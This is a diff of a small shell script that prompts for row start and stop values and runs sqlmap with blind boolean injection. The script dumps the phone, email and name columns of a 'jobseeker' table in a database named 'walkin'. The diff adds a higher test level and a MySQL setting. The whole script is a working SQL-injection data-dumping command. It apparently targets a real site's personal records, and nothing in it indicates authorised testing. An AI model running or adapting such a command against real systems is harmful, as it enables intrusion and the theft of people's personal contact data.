@@ -10,4 +10,4 @@ echo "input start value:"
 read start
 echo "input stop value:"
 read stop
-python3 /root/sqlmap/sqlmap.py -r /root/sqlmap/1.txt --drop-set-cookie --technique B --batch -D walkin -T jobseeker -C "phone,email,name" --dump --skip-urlencode --thread 10  --start $start --stop $stop
+python3 /root/sqlmap/sqlmap.py -r /root/sqlmap/1.txt --drop-set-cookie --technique B --level 5 --dbms mysql --batch -D walkin -T jobseeker -C "phone,email,name" --dump --skip-urlencode --thread 10  --start $start --stop $stop
